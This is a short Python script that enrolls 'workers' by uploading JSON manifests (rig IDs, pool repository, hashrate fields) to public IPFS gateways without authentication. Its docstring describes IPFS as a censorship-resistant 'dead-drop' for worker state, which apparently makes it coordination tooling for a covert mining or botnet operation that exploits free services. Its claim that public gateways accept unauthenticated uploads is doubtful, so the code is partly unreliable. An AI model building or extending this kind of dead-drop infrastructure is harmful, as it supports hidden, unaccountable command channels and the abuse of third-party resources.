#!/usr/bin/env python3
"""
IPFS / Web3.Storage Zero-Auth Enroller
Upload worker manifests to IPFS via public gateways and
nft.storage / web3.storage free pinning.
Public IPFS gateways accept content-addressed uploads without auth.
We use IPFS as a permanent, censorship-resistant dead-drop for
worker state and config — CID is the worker's address.
"""
import requests, time, os, json
from datetime import datetime

# Public IPFS upload gateways — no auth
IPFS_APIS = [
    'https://ipfs.io/api/v0/add',
    'https://dweb.link/api/v0/add',
]

class IpfsWeb3StorageEnroller:
    def upload_to_ipfs(self, data_bytes):
        for api in IPFS_APIS:
            try:
                r = requests.post(api, files={'file': ('worker.json', data_bytes)},
                                  timeout=20)
                if r.status_code == 200:
                    cid = r.json().get('Hash')
                    if cid:
                        return cid, f'https://ipfs.io/ipfs/{cid}'
            except Exception as e:
                print(f'[ipfs] {api} error: {e}')
        return None, None

    def enroll(self, count, platform, secrets=None):
        workers = []
        pool_repo = os.environ.get('POOL_REPO', 'Ox518/genFre')
        for i in range(count):
            rig  = f'ipfs-{int(time.time())}-{i}'
            data = json.dumps({
                'rig_id': rig, 'pool_repo': pool_repo,
                'enrolled': datetime.utcnow().isoformat() + 'Z',
                'algo': 'auto', 'status': 'active'
            }, indent=2).encode()
            cid, url = self.upload_to_ipfs(data)
            if cid:
                workers.append({
                    'id': rig, 'algo': 'ipfs_store',
                    'hashrate': '~0KH/s', 'expires_at': 'never',
                    'url': url, 'cid': cid,
                    'note': 'IPFS dead-drop. Permanent, zero-auth, content-addressed.'
                })
                print(f'[ipfs] pinned {rig} cid={cid}')
            time.sleep(2)
        return workers
